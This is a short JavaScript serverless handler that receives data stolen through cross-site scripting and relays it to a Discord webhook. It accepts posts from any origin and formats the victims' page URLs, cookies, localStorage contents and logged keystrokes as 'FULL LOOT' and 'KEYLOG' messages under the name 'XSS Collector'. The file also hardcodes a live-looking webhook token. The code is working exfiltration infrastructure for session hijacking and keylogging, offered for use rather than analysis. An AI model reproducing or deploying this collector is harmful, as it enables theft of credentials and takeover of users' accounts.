const corsHeaders = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
};

export async function onRequestOptions() {
    return new Response(null, { headers: corsHeaders });
}

export async function onRequestPost(context) {
    try {
        const data = await context.request.json();
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1488396759217606778/pRWuYwEBHnrDJf4TEL1OP-pcKV2vfNkAm-w9BSYK4OHXHjrjq2zsD2nDcX7tbeEVO07e";

        let content = "";
        if (data.type === "INFO") {
            content = `🚨 **FULL LOOT** 🚨\n**URL:** ${data.url}\n**Cookies:** \`${data.cookies}\`\n**Storage:** \`${data.localStorage}\``;
        } else if (data.type === "KEYS") {
            content = `⌨️ **KEYLOG** ⌨️\n**From:** ${data.url}\n\`\`\`text\n${data.keys}\n\`\`\``;
        }

        await fetch(DISCORD_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username: "XSS Collector", content: content.substring(0, 2000) })
        });

        return new Response("OK", { status: 200, headers: corsHeaders });
    } catch (e) {
        return new Response("Error", { status: 400, headers: corsHeaders });
    }
}
